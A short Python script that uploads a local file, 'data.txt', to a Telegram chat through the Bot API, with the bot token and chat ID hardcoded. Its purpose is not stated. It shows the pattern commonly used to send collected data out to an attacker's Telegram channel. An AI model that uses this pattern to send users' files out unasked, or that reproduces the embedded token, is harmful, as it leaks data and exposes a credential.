import requests
TOKEN = '5559122728:AAHOu1gL4pA1riJPMCmICNTKI57P5xnHsyA'
chat_id = 5575549228

def send_document(chat_id,TOKEN):
    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
    payload = {
        'chat_id':chat_id
    }
    document = open('data.txt','r')
    files = {
        'document':document
    }
    requests.post(url,params=payload, files=files)


send_document(chat_id, TOKEN)